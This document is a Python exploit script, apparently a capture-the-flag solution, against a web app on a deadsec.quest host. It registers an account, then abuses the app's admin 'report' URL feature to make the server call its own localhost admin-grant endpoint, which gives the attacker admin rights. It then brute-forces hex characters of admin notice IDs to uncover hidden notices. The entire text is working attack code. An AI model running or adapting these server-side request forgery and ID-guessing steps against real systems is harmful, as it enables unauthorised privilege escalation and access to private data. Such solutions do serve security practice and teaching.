import requests
import re

baseURL = "https://149f10ef5e1c3d471e0588fc.deadsec.quest"

def register(username, password, personalColor):
    url = baseURL + "/auth/register"
    sendJSON = {"username": username, "password": password, "personalColor": personalColor}
    r = requests.post(url, json=sendJSON)
    return r

def login(username, password):
    url = baseURL + "/auth/login"
    sendJSON = {"username": username, "password": password}
    r = requests.post(url, json=sendJSON)
    return r

user = "hacker"
passwd = "hacker"
personalColor = "#369369"
print(register(user, passwd, personalColor).json())

res = login(user, passwd).json()
print(res)
TOKEN=res["accessToken"]
print("accessToken:", TOKEN)

def makeAdmin(username, accessToken=TOKEN):
    url = baseURL + "/admin/report?url=http://localhost:1337/admin/grant?username=" + username
    sendCookie = {"accessToken": accessToken}
    r = requests.get(url, cookies=sendCookie)
    return r

print(makeAdmin(user).json())

# Login again to get new token
res = login(user, passwd).json()
print(res)
TOKEN=res["accessToken"]
print("accessToken:", TOKEN)


def getAdminNotice(noticeURL, accessToken=TOKEN):
    url = baseURL + "/admin/notice/" + noticeURL
    sendCookie = {"accessToken": accessToken}
    r = requests.get(url, cookies=sendCookie)
    return r

def getAllNotice(accessToken=TOKEN):
    url = baseURL + "/admin/notice"
    sendCookie = {"accessToken": accessToken}
    r = requests.get(url, cookies=sendCookie)
    res = r.text
    posts = re.findall("/admin/notice/[0-9a-f]{24}", res)
    return posts

notice = getAllNotice(TOKEN)[0][14:]
# notice[7], notice[-1]
characters = "abcdef1234567890"
for first in characters:
    for second in characters:
        newNotice = notice[0:7] + first + notice[8:-1] + second
        res = getAdminNotice(newNotice).text
        if '404' not in res:
            print(newNotice, res)